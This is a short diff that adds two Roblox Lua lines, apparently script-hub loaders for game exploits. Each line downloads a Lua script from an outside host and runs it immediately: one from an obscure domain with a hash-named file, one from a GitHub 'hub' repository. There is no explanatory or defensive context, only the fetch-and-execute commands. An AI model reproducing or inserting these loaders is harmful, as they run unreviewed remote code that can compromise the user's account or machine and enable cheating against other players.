@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://egorikusa.space/3067c521611b9e1394100ae3.lua", true))();
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/ReQiuYTPL/hub/main/ReQiuYTPLHub.lua'),true))()
